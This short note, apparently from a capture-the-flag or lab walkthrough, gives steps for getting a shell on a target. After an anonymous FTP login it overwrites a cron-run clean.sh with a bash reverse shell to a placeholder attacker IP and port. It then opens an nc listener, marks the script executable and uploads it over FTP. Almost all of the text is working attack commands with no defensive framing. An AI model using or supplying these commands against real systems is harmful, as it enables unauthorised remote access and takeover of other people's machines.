-------
ftp anon login 
found clean.sh that is being rn as a cron job

  replace the clean.sh w/ 
              #!/bin/bash
             bash -i >& /dev/tcp/[Your-IP-Address]/[PORT] 0>&1

  set listnener on attacker computer
              nc -lvnp [Same-Port-as-reverse-shell]

change clean.sh to be executeable 
              chmod +x clean.sh
log into ftp anf put file
              put clean.sh
